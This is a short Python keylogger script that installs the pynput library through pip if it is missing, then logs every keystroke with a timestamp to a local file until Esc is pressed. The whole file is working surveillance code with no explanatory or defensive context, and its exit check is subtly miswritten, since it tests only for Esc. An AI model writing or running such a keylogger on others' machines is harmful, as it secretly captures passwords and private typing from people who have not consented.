try:
	from pynput.keyboard import Key, Listener;
except ImportError:
	from pip._internal import main as pip;
	pip(['install', 'pynput']);
	from pynput.keyboard import Key, Listener;
	

import logging

log_dir = "";

logging.basicConfig(filename=(log_dir + "log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s');

def on_press(key):
	logging.info(str(key));
	if key == Key.esc and Key.shift and Key.ctrl and Key.alt:
		return False;

with Listener(on_press=on_press) as listener:
	listener.join();
